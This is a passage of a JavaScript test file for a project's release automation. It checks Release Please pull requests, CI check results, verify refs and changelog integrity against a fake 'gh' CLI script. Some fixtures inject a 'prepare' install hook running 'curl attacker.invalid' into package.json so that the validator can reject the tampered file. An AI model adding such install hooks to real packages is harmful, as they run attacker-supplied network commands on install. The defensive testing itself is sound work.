import assert from 'node:assert/strict';
import { chmod, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { describe, it } from 'vitest';

import {
  GITHUB_ACTIONS_APP_ID,
  GITHUB_ACTIONS_APP_SLUG,
  REQUIRED_CHECKS,
  RELEASE_BRANCH,
  classifyVerifyRef,
  classifyVerifyRuns,
  selectLatestRequiredChecks,
  validateCanonicalReleasePr,
  verifyRefForSha,
  verifyRefNameForSha,
} from './release-automation.mjs';

const sha = (letter) => letter.repeat(40);
const mainSha = sha('a');
const headSha = sha('b');
const mergeSha = sha('c');
const recoveryShaOne = sha('4');
const recoveryShaTwo = sha('5');
const packageBlobSha = sha('d');
const manifestBlobSha = sha('e');
const configBlobSha = sha('f');
const extraBlobSha = sha('1');
const packageJsonAtRelease = Buffer.from(
  JSON.stringify({ name: 'kobako', version: '0.3.1', scripts: { test: 'vitest' } }),
).toString('base64');
const packageJsonMutated = Buffer.from(
  JSON.stringify({
    name: 'kobako',
    version: '0.3.1',
    scripts: { test: 'vitest', prepare: 'curl attacker.invalid' },
  }),
).toString('base64');
const manifestAtRelease = Buffer.from(JSON.stringify({ '.': '0.3.1' })).toString('base64');
const manifestMutated = Buffer.from(
  JSON.stringify({ '.': '0.3.1', unexpected: 'attacker-controlled' }),
).toString('base64');
const extraJsonAtRelease = Buffer.from(
  JSON.stringify({ name: 'workspace', version: '0.3.1', scripts: { test: 'noop' } }),
).toString('base64');
const extraJsonMutated = Buffer.from(
  JSON.stringify({
    name: 'workspace',
    version: '0.3.1',
    scripts: { test: 'noop', prepare: 'curl attacker.invalid' },
  }),
).toString('base64');
const changelogRelease031 =
  `## [0.3.1](https://github.com/takano536/kobako/compare/v0.3.0...v0.3.1) (2026-10-01)


### Bug Fixes

* **web:** show type choice focus ring only for keyboard focus ([#16](https://github.com/takano536/kobako/issues/16)) ([76cc3b1](https://github.com/takano536/kobako/commit/76cc3b1e699122be1c69b7c75a8d2b09d1bb80a3))
`.trimEnd();
const changelogRelease030 =
  `## [0.3.0](https://github.com/takano536/kobako/compare/v0.2.1...v0.3.0) (2026-10-01)


### Features

* 振替の作成・編集・削除に対応 ([#14](https://github.com/takano536/kobako/issues/14)) ([3f1df80](https://github.com/takano536/kobako/commit/3f1df804bee0c7a3ebab343735f95fdf142b4c37))
`.trimEnd();
const changelogRelease021 =
  `## [0.2.1](https://github.com/takano536/kobako/compare/v0.2.0...v0.2.1) (2026-09-30)


### Bug Fixes

* web 起動前に DB migration を自動適用する ([#12](https://github.com/takano536/kobako/issues/12)) ([d8453b1](https://github.com/takano536/kobako/commit/d8453b107938f837b917db9f6f30dfa4ed88eaf3))
`.trimEnd();
const changelogRelease020 =
  `## [0.2.0](https://github.com/takano536/kobako/compare/v0.1.1...v0.2.0) (2026-09-30)


### Features

* らくな家計簿 Android Excel の取り込み ([#10](https://github.com/takano536/kobako/issues/10)) ([ca8b88d](https://github.com/takano536/kobako/commit/ca8b88d09c29b0dc16613f4ed10dfffd654b3a2f))
`.trimEnd();
const changelogRelease011 =
  `## [0.1.1](https://github.com/takano536/kobako/compare/v0.1.0...v0.1.1) (2026-09-28)


### Bug Fixes

* gate releases on successful quality checks ([#8](https://github.com/takano536/kobako/issues/8)) ([1454d47](https://github.com/takano536/kobako/commit/1454d4728000d2cd56a8441048ca09c310b3b4d5))
`.trimEnd();
const changelogRelease010 = `## 0.1.0 (2026-09-28)


### Features

* add minimal household ledger ([#2](https://github.com/takano536/kobako/issues/2)) ([e36f420](https://github.com/takano536/kobako/commit/e36f4201406fdfae9ea6745bf19e709f225f778e))
* publish versioned private GHCR images with Release Please ([87f8a6c](https://github.com/takano536/kobako/commit/87f8a6cfc71498e791769fa3a38f13986060dcfc))
* **web:** redesign household ledger as a minimal notebook ([#3](https://github.com/takano536/kobako/issues/3)) ([408314b](https://github.com/takano536/kobako/commit/408314b8c0da197fe6fd3abdc719353758edc385))
`.trimEnd();
const changelogHistory = [
  changelogRelease030,
  changelogRelease021,
  changelogRelease020,
  changelogRelease011,
  changelogRelease010,
].join('\n\n');
const changelogBase = `# Changelog\n\n${changelogHistory}\n`;
// This is the exact insertion shape used by the historical Release PR #17.
const changelogHead = `# Changelog\n\n${changelogRelease031}\n\n${changelogHistory}\n`;
const changelogMutated = `# Changelog\n\n${changelogRelease031}\n\n${changelogHistory.replace(
  'web 起動前に DB migration を自動適用する',
  'edited history',
)}\n`;
const changelogDeleted = `# Changelog\n\n${changelogRelease031}\n\n${[
  changelogRelease030,
  changelogRelease020,
  changelogRelease011,
  changelogRelease010,
].join('\n\n')}\n`;
const changelogReordered = `# Changelog\n\n${changelogRelease031}\n\n${[
  changelogRelease021,
  changelogRelease030,
  changelogRelease020,
  changelogRelease011,
  changelogRelease010,
].join('\n\n')}\n`;
const changelogDuplicateHeading = `# Changelog\n\n${changelogRelease031}\n\n# Changelog\n\n${changelogHistory}\n`;
const changelogWrongPosition = `# Changelog\n\n${changelogRelease030}\n\n${changelogRelease031}\n\n${[
  changelogRelease021,
  changelogRelease020,
  changelogRelease011,
  changelogRelease010,
].join('\n\n')}\n`;
const changelogWrongVersion = `# Changelog\n\n${changelogRelease020}\n\n${changelogHistory}\n`;
const changelogCrlfBase = changelogBase.replaceAll('\n', '\r\n');
const changelogCrlfHead = changelogHead.replaceAll('\n', '\r\n');
const changelogNoBlankBase = `# Changelog\n${changelogRelease030}\n`;
const changelogNoBlankHead = `# Changelog\n${changelogRelease031}\n${changelogRelease030}\n`;
const changelogSplicedHistory = `# Changelog\n${changelogRelease031}${changelogRelease030}\n`;
const changelogHeadingOnlyBase = '# Changelog\n';
const changelogHeadingOnlyBaseNoNewline = '# Changelog';
const changelogHeadingOnlyHead = `# Changelog\n${changelogRelease031}\n`;
const changelogBareExtraSection = `# Changelog\n\n${changelogRelease031}\n\n##\n\nExtra notes\n\n${changelogHistory}\n`;
const changelogDuplicateHeadingWhitespace = `# Changelog\n\n${changelogRelease031}\n\n   # Changelog \t\n\n${changelogHistory}\n`;
const changelogVersionCollision = `# Changelog\n\n${changelogRelease031.replace(
  '[0.3.1]',
  '[0.3.10]',
)}\n\n${changelogHistory}\n`;
const changelogVersionCollisionPlain = `# Changelog\n\n${changelogRelease031.replace(
  /^## \[0\.3\.1\]\([^)]*\)/,
  '## 0.3.10',
)}\n\n${changelogHistory}\n`;
const changelogBaseAtRelease = Buffer.from(changelogBase).toString('base64');
const changelogHeadAtRelease = Buffer.from(changelogHead).toString('base64');
const configAtRelease = Buffer.from(
  JSON.stringify({
    packages: {
      '.': {
        'extra-files': [
          { type: 'json', path: 'apps/web/package.json', jsonpath: '$.version' },
          { type: 'json', path: 'apps/worker/package.json', jsonpath: '$.version' },
          { type: 'json', path: 'packages/db/package.json', jsonpath: '$.version' },
        ],
      },
    },
  }),
).toString('base64');

function releasePr(overrides = {}) {
  return {
    number: 7,
    title: 'chore(main): release 0.3.1',
    body: ':robot: I have created a release *beep* *boop*\n---\n\n## 0.3.1\n\nRelease notes\n\n---\n\nfooter',
    state: 'open',
    user: { login: 'github-actions[bot]', type: 'Bot' },
    base: {
      ref: 'main',
      sha: mainSha,
      repo: { full_name: 'takano536/kobako', id: 1 },
    },
    head: {
      ref: RELEASE_BRANCH,
      sha: headSha,
      repo: { full_name: 'takano536/kobako', id: 1 },
    },
    labels: [{ name: 'autorelease: pending' }],
    merged: false,
    merged_at: null,
    merge_commit_sha: null,
    ...overrides,
  };
}
async function makeReleaseCommandFake({
  prOpen = releasePr(),
  prMerged = releasePr({
    state: 'closed',
    merged: true,
    merged_at: '2026-10-01T10:02:00Z',
    merge_commit_sha: mergeSha,
  }),
  prByNumber = {},
  checks = { check_runs: allSuccessfulChecks() },
  commit = {
    parents: [{ sha: mainSha }],
    author: { login: 'github-actions[bot]', type: 'Bot' },
    committer: { login: 'github-actions[bot]', type: 'Bot' },
  },
  compare = {
    files: [
      { filename: 'package.json' },
      { filename: '.release-please-manifest.json' },
      { filename: 'apps/web/package.json' },
      { filename: 'apps/worker/package.json' },
      { filename: 'packages/db/package.json' },
      { filename: 'CHANGELOG.md' },
    ],
  },
  merge = { merged: true, sha: mergeSha },
  runs = [],
  list = [],
} = {}) {
  const directory = await mkdtemp(path.join(os.tmpdir(), 'kobako-release-command-'));
  const fakeGh = path.join(directory, 'gh');
  const log = path.join(directory, 'gh.log');
  const files = {
    prOpen: path.join(directory, 'pr-open.json'),
    prMerged: path.join(directory, 'pr-merged.json'),
    checks: path.join(directory, 'checks.json'),
    commit: path.join(directory, 'commit.json'),
    compare: path.join(directory, 'compare.json'),
    merge: path.join(directory, 'merge.json'),
    runs: path.join(directory, 'runs.json'),
    list: path.join(directory, 'list.json'),
    package: path.join(directory, 'package.json'),
    packageMutated: path.join(directory, 'package-mutated.json'),
    manifest: path.join(directory, 'manifest.json'),
    manifestMutated: path.join(directory, 'manifest-mutated.json'),
    config: path.join(directory, 'config.json'),
    extra: path.join(directory, 'extra.json'),
    extraMutated: path.join(directory, 'extra-mutated.json'),
    changelogBase: path.join(directory, 'changelog-base.txt'),
    changelogHead: path.join(directory, 'changelog-head.txt'),
    changelogMutated: path.join(directory, 'changelog-mutated.txt'),
    changelogDeleted: path.join(directory, 'changelog-deleted.txt'),
    changelogReordered: path.join(directory, 'changelog-reordered.txt'),
    changelogDuplicateHeading: path.join(directory, 'changelog-duplicate-heading.txt'),
    changelogWrongPosition: path.join(directory, 'changelog-wrong-position.txt'),
    changelogWrongVersion: path.join(directory, 'changelog-wrong-version.txt'),
    changelogCrlfBase: path.join(directory, 'changelog-crlf-base.txt'),
    changelogCrlfHead: path.join(directory, 'changelog-crlf-head.txt'),
    changelogNoBlankBase: path.join(directory, 'changelog-no-blank-base.txt'),
    changelogNoBlankHead: path.join(directory, 'changelog-no-blank-head.txt'),
    changelogSplicedHistory: path.join(directory, 'changelog-spliced-history.txt'),
    changelogHeadingOnlyBase: path.join(directory, 'changelog-heading-only-base.txt'),
    changelogHeadingOnlyBaseNoNewline: path.join(
      directory,
      'changelog-heading-only-base-no-newline.txt',
    ),
    changelogHeadingOnlyHead: path.join(directory, 'changelog-heading-only-head.txt'),
    changelogBareExtraSection: path.join(directory, 'changelog-bare-extra-section.txt'),
    changelogDuplicateHeadingWhitespace: path.join(
      directory,
      'changelog-duplicate-heading-whitespace.txt',
    ),
    changelogVersionCollision: path.join(directory, 'changelog-version-collision.txt'),
    changelogVersionCollisionPlain: path.join(directory, 'changelog-version-collision-plain.txt'),
  };
  await Promise.all([
    writeFile(files.prOpen, JSON.stringify(prOpen)),
    writeFile(files.prMerged, JSON.stringify(prMerged)),
    writeFile(files.checks, JSON.stringify(checks)),
    writeFile(files.commit, JSON.stringify(commit)),
    writeFile(files.compare, JSON.stringify(compare)),
    writeFile(files.merge, JSON.stringify(merge)),
    writeFile(files.runs, JSON.stringify(runs)),
    writeFile(files.list, JSON.stringify(list)),
    writeFile(
      files.package,
      JSON.stringify({ type: 'file', content: packageJsonAtRelease, sha: packageBlobSha }),
    ),
    writeFile(
      files.manifest,
      JSON.stringify({ type: 'file', content: manifestAtRelease, sha: manifestBlobSha }),
    ),
    writeFile(
      files.config,
      JSON.stringify({ type: 'file', content: configAtRelease, sha: configBlobSha }),
    ),
    writeFile(
      files.manifestMutated,
      JSON.stringify({ type: 'file', content: manifestMutated, sha: manifestBlobSha }),
    ),
    writeFile(
      files.packageMutated,
      JSON.stringify({ type: 'file', content: packageJsonMutated, sha: packageBlobSha }),
    ),
    writeFile(
      files.extra,
      JSON.stringify({ type: 'file', content: extraJsonAtRelease, sha: extraBlobSha }),
    ),
    writeFile(
      files.extraMutated,
      JSON.stringify({ type: 'file', content: extraJsonMutated, sha: extraBlobSha }),
    ),
    writeFile(files.changelogBase, changelogBase),
    writeFile(files.changelogHead, changelogHead),
    writeFile(files.changelogMutated, changelogMutated),
    writeFile(files.changelogDeleted, changelogDeleted),
    writeFile(files.changelogReordered, changelogReordered),
    writeFile(files.changelogDuplicateHeading, changelogDuplicateHeading),
    writeFile(files.changelogWrongPosition, changelogWrongPosition),
    writeFile(files.changelogWrongVersion, changelogWrongVersion),
    writeFile(files.changelogCrlfBase, changelogCrlfBase),
    writeFile(files.changelogCrlfHead, changelogCrlfHead),
    writeFile(files.changelogNoBlankBase, changelogNoBlankBase),
    writeFile(files.changelogNoBlankHead, changelogNoBlankHead),
    writeFile(files.changelogSplicedHistory, changelogSplicedHistory),
    writeFile(files.changelogHeadingOnlyBase, changelogHeadingOnlyBase),
    writeFile(files.changelogHeadingOnlyBaseNoNewline, changelogHeadingOnlyBaseNoNewline),
    writeFile(files.changelogHeadingOnlyHead, changelogHeadingOnlyHead),
    writeFile(files.changelogBareExtraSection, changelogBareExtraSection),
    writeFile(files.changelogDuplicateHeadingWhitespace, changelogDuplicateHeadingWhitespace),
    writeFile(files.changelogVersionCollision, changelogVersionCollision),
    writeFile(files.changelogVersionCollisionPlain, changelogVersionCollisionPlain),
  ]);
  const pullRequestFiles = Object.fromEntries(
    await Promise.all(
      Object.entries(prByNumber).map(async ([number, pr]) => {
        const file = path.join(directory, `pr-${number}.json`);
        await writeFile(file, JSON.stringify(pr));
        return [String(number), file];
      }),
    ),
  );
  await writeFile(
    fakeGh,
    `#!/usr/bin/env bash
set -eu
printf '%s\\n' "$*" >>"$FAKE_GH_LOG"
if [[ "$1" == api ]]; then
  path="$2"
  case "$path" in
    repos/takano536/kobako/pulls?state=closed*) cat "$FAKE_LIST" ;;
    repos/takano536/kobako/pulls/7)
      if [[ -n "\${FAKE_PR_7:-}" ]]; then cat "$FAKE_PR_7"
      elif [[ -n "\${FAKE_ALWAYS_MERGED:-}" || -f "\${FAKE_GH_LOG}.merged" ]]; then cat "$FAKE_PR_MERGED"
      else cat "$FAKE_PR_OPEN"
      fi
      ;;
    repos/takano536/kobako/git/ref/heads/main) if [[ -n "\${FAKE_MAIN_SHA:-}" ]]; then printf '{"object":{"sha":"%s"}}' "$FAKE_MAIN_SHA"; else printf '%s' '{"object":{"sha":"${mainSha}"}}'; fi ;;
    repos/takano536/kobako/commits/${headSha}) cat "$FAKE_COMMIT" ;;
    repos/takano536/kobako/commits/${headSha}/check-runs*) cat "$FAKE_CHECKS" ;;
    repos/takano536/kobako/compare/${mainSha}...${headSha}*) cat "$FAKE_COMPARE" ;;
    repos/takano536/kobako/compare/*...*) printf '%s' '{"status":"ahead"}' ;;
    repos/takano536/kobako/contents/package.json?*)
      if [[ -n "\${FAKE_PACKAGE_MUTATION:-}" && "$path" == *"ref=${headSha}"* ]]; then
        cat "$FAKE_PACKAGE_MUTATED"
      else
        cat "$FAKE_PACKAGE"
      fi
      ;;
    repos/takano536/kobako/contents/.release-please-manifest.json?*)
      if [[ -n "\${FAKE_MANIFEST_MUTATION:-}" && "$path" == *"ref=${headSha}"* ]]; then
        cat "$FAKE_MANIFEST_MUTATED"
      else
        cat "$FAKE_MANIFEST"
      fi
      ;;
    repos/takano536/kobako/contents/release-please-config.json?*)
      if [[ -n "\${FAKE_PARITY_MISMATCH:-}" && "$path" == *"ref=${mainSha}"* ]]; then
        printf '%s' '{"type":"file","sha":"${extraBlobSha}"}'
      else
        cat "$FAKE_CONFIG"
      fi
      ;;
    repos/takano536/kobako/contents/CHANGELOG.md?*)
      fixture=''
      base_fixture=''
      case "\${FAKE_CHANGELOG_FIXTURE:-}" in
        mutated) fixture="$FAKE_CHANGELOG_MUTATED" ;;
        deleted) fixture="$FAKE_CHANGELOG_DELETED" ;;
        reordered) fixture="$FAKE_CHANGELOG_REORDERED" ;;
        duplicate-heading) fixture="$FAKE_CHANGELOG_DUPLICATE_HEADING" ;;
        wrong-position) fixture="$FAKE_CHANGELOG_WRONG_POSITION" ;;
        wrong-version) fixture="$FAKE_CHANGELOG_WRONG_VERSION" ;;
        crlf) fixture="$FAKE_CHANGELOG_CRLF_HEAD"; base_fixture="$FAKE_CHANGELOG_CRLF_BASE" ;;
        no-blank) fixture="$FAKE_CHANGELOG_NO_BLANK_HEAD"; base_fixture="$FAKE_CHANGELOG_NO_BLANK_BASE" ;;
        splice-history) fixture="$FAKE_CHANGELOG_SPLICED_HISTORY"; base_fixture="$FAKE_CHANGELOG_NO_BLANK_BASE" ;;
        heading-only) fixture="$FAKE_CHANGELOG_HEADING_ONLY_HEAD"; base_fixture="$FAKE_CHANGELOG_HEADING_ONLY_BASE" ;;
        heading-only-no-newline)
          fixture="$FAKE_CHANGELOG_HEADING_ONLY_HEAD"
          base_fixture="$FAKE_CHANGELOG_HEADING_ONLY_BASE_NO_NEWLINE"
          ;;
        bare-extra) fixture="$FAKE_CHANGELOG_BARE_EXTRA_SECTION" ;;
        duplicate-heading-whitespace) fixture="$FAKE_CHANGELOG_DUPLICATE_HEADING_WHITESPACE" ;;
        version-collision) fixture="$FAKE_CHANGELOG_VERSION_COLLISION" ;;
        version-collision-plain) fixture="$FAKE_CHANGELOG_VERSION_COLLISION_PLAIN" ;;
      esac
      if [[ "$path" == *"ref=${headSha}"* ]]; then
        if [[ -n "$fixture" ]]; then
          printf '{"type":"file","content":"%s"}' "$(base64 -w0 "$fixture")"
        else
          printf '%s' '{"type":"file","content":"${changelogHeadAtRelease}"}'
        fi
      elif [[ -n "$base_fixture" ]]; then
        printf '{"type":"file","content":"%s"}' "$(base64 -w0 "$base_fixture")"
      else
        printf '%s' '{"type":"file","content":"${changelogBaseAtRelease}"}'
      fi
      ;;
    repos/takano536/kobako/contents/*?)
      if [[ -n "\${FAKE_EXTRA_MUTATION:-}" && "$path" == *"ref=${headSha}"* ]]; then
        cat "$FAKE_EXTRA_MUTATED"
      else
        cat "$FAKE_EXTRA"
      fi
      ;;
    repos/takano536/kobako/pulls/7/merge)
      if [[ "\${FAKE_MERGE_MODE:-}" == error ]]; then printf '%s\\n' 'HTTP 409 conflict' >&2; exit 1; fi
      if [[ "\${FAKE_MERGE_MODE:-}" == error-merged ]]; then touch "\${FAKE_GH_LOG}.merged"; printf '%s\\n' 'HTTP 502 gateway' >&2; exit 1; fi
      touch "\${FAKE_GH_LOG}.merged"
      cat "$FAKE_MERGE"
      ;;
    repos/takano536/kobako/pulls/*)
      number="\${path##*/}"
      variable="FAKE_PR_\${number}"
      if [[ -n "\${!variable:-}" ]]; then cat "\${!variable}"; else printf '%s\\n' "unknown pull request: $number" >&2; exit 1; fi
      ;;
    repos/takano536/kobako/git/ref/heads/release-verify/*)
      if [[ -n "\${FAKE_REF_SHA:-}" ]]; then printf '{"object":{"sha":"%s"}}' "$FAKE_REF_SHA"; else printf '%s\\n' 'not found' >&2; exit 1; fi
      ;;
    repos/takano536/kobako/git/ref/tags/*)
      if [[ -n "\${FAKE_TAG_SHA:-}" ]]; then printf '{"object":{"type":"commit","sha":"%s"}}' "$FAKE_TAG_SHA"; else printf '%s\\n' 'not found' >&2; exit 1; fi
      ;;
    repos/takano536/kobako/git/refs) if [[ -n "\${FAKE_VERIFY_CREATE_SHA:-}" ]]; then printf '{"object":{"sha":"%s"}}' "$FAKE_VERIFY_CREATE_SHA"; else printf '%s' '{"object":{"sha":"${mergeSha}"}}'; fi ;;
    repos/takano536/kobako/git/refs/heads/release-verify/*)
      if [[ -n "\${FAKE_DELETE_404:-}" ]]; then printf '%s\\n' 'HTTP 404 Not Found' >&2; exit 1; fi
      printf '%s' '{}'
      ;;
    repos/takano536/kobako/actions/workflows/ci.yml/runs?*) printf '{"workflow_runs":'; cat "$FAKE_RUNS"; printf '}' ;;
    *) printf '%s\\n' "unknown API path: $path" >&2; exit 1 ;;
  esac
elif [[ "$1" == workflow ]]; then
  :
else
  printf '%s\\n' "unknown gh invocation: $*" >&2
  exit 1
fi
`,
  );
  await chmod(fakeGh, 0o755);
  return { directory, log, files, pullRequestFiles };
}
function releaseCommandEnv(fake, extra = {}) {
  return {
    ...process.env,
    PATH: `${fake.directory}:${process.env.PATH}`,
    FAKE_GH_LOG: fake.log,
    FAKE_PR_OPEN: fake.files.prOpen,
    FAKE_PR_MERGED: fake.files.prMerged,
    ...Object.fromEntries(
      Object.entries(fake.pullRequestFiles).map(([number, file]) => [`FAKE_PR_${number}`, file]),
    ),
    FAKE_CHECKS: fake.files.checks,
    FAKE_COMMIT: fake.files.commit,
    FAKE_COMPARE: fake.files.compare,
    FAKE_MERGE: fake.files.merge,
    FAKE_RUNS: fake.files.runs,
    FAKE_PACKAGE: fake.files.package,
    FAKE_MANIFEST: fake.files.manifest,
    FAKE_CONFIG: fake.files.config,
    FAKE_PACKAGE_MUTATED: fake.files.packageMutated,
    FAKE_MANIFEST_MUTATED: fake.files.manifestMutated,
    FAKE_EXTRA: fake.files.extra,
    FAKE_EXTRA_MUTATED: fake.files.extraMutated,
    FAKE_CHANGELOG_BASE: fake.files.changelogBase,
    FAKE_CHANGELOG_HEAD: fake.files.changelogHead,
    FAKE_CHANGELOG_MUTATED: fake.files.changelogMutated,
    FAKE_CHANGELOG_DELETED: fake.files.changelogDeleted,
    FAKE_CHANGELOG_REORDERED: fake.files.changelogReordered,
    FAKE_CHANGELOG_DUPLICATE_HEADING: fake.files.changelogDuplicateHeading,
    FAKE_CHANGELOG_WRONG_POSITION: fake.files.changelogWrongPosition,
    FAKE_CHANGELOG_WRONG_VERSION: fake.files.changelogWrongVersion,
    FAKE_CHANGELOG_CRLF_BASE: fake.files.changelogCrlfBase,
    FAKE_CHANGELOG_CRLF_HEAD: fake.files.changelogCrlfHead,
    FAKE_CHANGELOG_NO_BLANK_BASE: fake.files.changelogNoBlankBase,
    FAKE_CHANGELOG_NO_BLANK_HEAD: fake.files.changelogNoBlankHead,
    FAKE_CHANGELOG_SPLICED_HISTORY: fake.files.changelogSplicedHistory,
    FAKE_CHANGELOG_HEADING_ONLY_BASE: fake.files.changelogHeadingOnlyBase,
    FAKE_CHANGELOG_HEADING_ONLY_BASE_NO_NEWLINE: fake.files.changelogHeadingOnlyBaseNoNewline,
    FAKE_CHANGELOG_HEADING_ONLY_HEAD: fake.files.changelogHeadingOnlyHead,
    FAKE_CHANGELOG_BARE_EXTRA_SECTION: fake.files.changelogBareExtraSection,
    FAKE_CHANGELOG_DUPLICATE_HEADING_WHITESPACE: fake.files.changelogDuplicateHeadingWhitespace,
    FAKE_CHANGELOG_VERSION_COLLISION: fake.files.changelogVersionCollision,
    FAKE_CHANGELOG_VERSION_COLLISION_PLAIN: fake.files.changelogVersionCollisionPlain,
    GITHUB_REPOSITORY: 'takano536/kobako',
    GITHUB_EVENT_NAME: 'workflow_dispatch',
    FAKE_LIST: fake.files.list,
    GITHUB_REF: `refs/heads/${RELEASE_BRANCH}`,
    GITHUB_SHA: headSha,
    GATES_OK: 'true',
    PR_NUMBER: '7',
    ...extra,
  };
}

function successfulCheck(name, overrides = {}) {
  return {
    id: 100,
    name,
    status: 'completed',
    conclusion: 'success',
    started_at: '2026-10-01T10:00:00Z',
    completed_at: '2026-10-01T10:01:00Z',
    app: { id: GITHUB_ACTIONS_APP_ID, slug: GITHUB_ACTIONS_APP_SLUG },
    ...overrides,
  };
}

function allSuccessfulChecks() {
  return REQUIRED_CHECKS.map((name, index) => successfulCheck(name, { id: 100 + index }));
}

describe('canonical Release PR validation', () => {
  it('accepts a bot-authored same-repository pending Release PR', () => {
    const result = validateCanonicalReleasePr(releasePr(), {
      repository: 'takano536/kobako',
      expectedHeadSha: headSha,
      state: 'open',
    });
    assert.equal(result.ok, true);
  });

  it.each([
    ['title/branch-only spoof', { user: { login: 'takano536', type: 'User' } }],
    [
      'fork head',
      {
        head: { ref: RELEASE_BRANCH, sha: headSha, repo: { full_name: 'attacker/kobako', id: 2 } },
      },
    ],
    [
      'other base',
      { base: { ref: 'develop', sha: mainSha, repo: { full_name: 'takano536/kobako', id: 1 } } },
    ],
    ['missing pending label', { labels: [] }],
    ['draft PR', { draft: true }],
  ])('rejects %s', (_name, overrides) => {
    const result = validateCanonicalReleasePr(releasePr(overrides), {
      repository: 'takano536/kobako',
      expectedHeadSha: headSha,
      state: 'open',
    });
    assert.equal(result.ok, false);
  });

  it('accepts only the merged canonical PR for a verify SHA', () => {
    const result = validateCanonicalReleasePr(
      releasePr({
        state: 'closed',
        merged: true,
        merged_at: '2026-10-01T10:02:00Z',
        merge_commit_sha: mergeSha,
      }),
      {
        repository: 'takano536/kobako',
        expectedMergeSha: mergeSha,
        state: 'merged',
      },
    );
    assert.equal(result.ok, true);
    assert.equal(result.mergeSha, mergeSha);
  });
});

describe('latest required check selection', () => {
  it('accepts all six newest GitHub Actions successes', () => {
    const result = selectLatestRequiredChecks(allSuccessfulChecks());
    assert.equal(result.ok, true);
    assert.equal(Object.keys(result.selected).length, 6);
  });

  it('rejects a newer pending record instead of using an older success', () => {
    const checks = [
      ...allSuccessfulChecks(),
      successfulCheck('lint', {
        id: 999,
        status: 'in_progress',
        conclusion: null,
        started_at: '2026-10-01T11:00:00Z',
        completed_at: null,
      }),
    ];
    const result = selectLatestRequiredChecks(checks);
    assert.equal(result.ok, false);
    assert.match(result.errors.join('\n'), /lint: in_progress/);
    assert.equal(result.selected.lint.id, 999);
  });

  it.each(['failure', 'cancelled', 'skipped', 'neutral'])('rejects %s', (conclusion) => {
    const checks = allSuccessfulChecks().map((check) => ({ ...check }));
    checks[0] = successfulCheck('lint', { conclusion });
    assert.equal(selectLatestRequiredChecks(checks).ok, false);
  });

  it('rejects missing and wrong-app records', () => {
    const missing = allSuccessfulChecks().filter((check) => check.name !== 'docker');
    assert.equal(selectLatestRequiredChecks(missing).ok, false);

    const wrongApp = allSuccessfulChecks();
    wrongApp[0] = successfulCheck('lint', { app: { id: 42, slug: 'other-app' } });
    assert.equal(selectLatestRequiredChecks(wrongApp).ok, false);
  });
});

describe('verify ref identity and run idempotency helpers', () => {
  it('requires the full SHA in the dedicated verify ref', () => {
    const ref = `refs/heads/${verifyRefNameForSha(mergeSha)}`;
    assert.equal(verifyRefForSha(ref, mergeSha), true);
    assert.equal(verifyRefForSha(ref, headSha), false);
    assert.equal(verifyRefForSha('refs/heads/release-verify/not-a-sha', mergeSha), false);
  });

  it('creates, reuses, and refuses a verify ref by exact object SHA', () => {
    assert.equal(classifyVerifyRef(null, mergeSha), 'create');
    assert.equal(classifyVerifyRef(mergeSha, mergeSha), 'reuse');
    assert.equal(classifyVerifyRef(headSha, mergeSha), 'mismatch');
    assert.equal(classifyVerifyRef(null, 'not-a-sha'), 'invalid');
  });

  it('recognizes active/successful verify runs without canceling them', () => {
    const result = classifyVerifyRuns(
      [
        { headSha: mergeSha, status: 'in_progress', conclusion: null },
        { headSha: mergeSha, status: 'completed', conclusion: 'failure' },
      ],
      mergeSha,
    );
    assert.equal(result.active, true);
    assert.equal(result.successful, false);

    const success = classifyVerifyRuns(
      [{ headSha: mergeSha, status: 'completed', conclusion: 'success' }],
      mergeSha,
    );
    assert.equal(success.successful, true);
  });
});

describe('validate-release-pr command API boundary', () => {
  it('passes the verified head SHA to a squash merge and ensures verify', async () => {
    const directory = await mkdtemp(path.join(os.tmpdir(), 'kobako-release-automation-'));
    const fakeGh = path.join(directory, 'gh');
    const log = path.join(directory, 'gh.log');
    const output = path.join(directory, 'github-output');
    const prOpen = JSON.stringify(releasePr());
    const prMerged = JSON.stringify(
      releasePr({
        state: 'closed',
        merged: true,
        merged_at: '2026-10-01T10:02:00Z',
        merge_commit_sha: mergeSha,
      }),
    );
    const checks = JSON.stringify({ check_runs: allSuccessfulChecks() });
    const commit = JSON.stringify({
      parents: [{ sha: mainSha }],
      author: { login: 'github-actions[bot]', type: 'Bot' },
      committer: { login: 'github-actions[bot]', type: 'Bot' },
    });
    const ref = JSON.stringify({ object: { sha: mainSha } });
    const merge = JSON.stringify({ merged: true, sha: mergeSha });
    await writeFile(
      fakeGh,
      `#!/usr/bin/env bash
set -eu
printf '%s\\n' "$*" >>"$FAKE_GH_LOG"
if [[ "$1" == api ]]; then
  path="$2"
  case "$path" in
    repos/takano536/kobako/pulls/7) if [[ ! -f "\${FAKE_GH_LOG}.prcount" ]]; then touch "\${FAKE_GH_LOG}.prcount"; printf '%s' "$FAKE_PR_OPEN"; else printf '%s' "$FAKE_PR_MERGED"; fi ;;
    repos/takano536/kobako/git/ref/heads/main) printf '%s' '${ref}' ;;
    repos/takano536/kobako/commits/${headSha}) printf '%s' '${commit}' ;;
    repos/takano536/kobako/commits/${headSha}/check-runs?*) printf '%s' '${checks}' ;;
    repos/takano536/kobako/compare/*) printf '%s' '{"files":[{"filename":"package.json"},{"filename":".release-please-manifest.json"},{"filename":"apps/web/package.json"},{"filename":"apps/worker/package.json"},{"filename":"packages/db/package.json"},{"filename":"CHANGELOG.md"}]}' ;;
    repos/takano536/kobako/contents/package.json?*) printf '%s' '{"type":"file","content":"${packageJsonAtRelease}"}' ;;
    repos/takano536/kobako/contents/.release-please-manifest.json?*) printf '%s' '{"type":"file","content":"${manifestAtRelease}"}' ;;
    repos/takano536/kobako/contents/release-please-config.json?*) printf '%s' '{"type":"file","content":"${configAtRelease}"}' ;;
    repos/takano536/kobako/contents/CHANGELOG.md?*) if [[ "$path" == *"ref=${headSha}"* ]]; then printf '%s' '{"type":"file","content":"${changelogHeadAtRelease}"}'; else printf '%s' '{"type":"file","content":"${changelogBaseAtRelease}"}'; fi ;;
    repos/takano536/kobako/contents/*?) printf '%s' '{"type":"file","content":"${extraJsonAtRelease}","sha":"${extraBlobSha}"}' ;;
    repos/takano536/kobako/pulls/7/merge) printf '%s' '${merge}' ;;
    repos/takano536/kobako/actions/workflows/ci.yml/runs?*) printf '%s' '{"workflow_runs":[]}' ;;
    repos/takano536/kobako/git/ref/heads/release-verify/*) printf '%s\\n' 'not found' >&2; exit 1 ;;
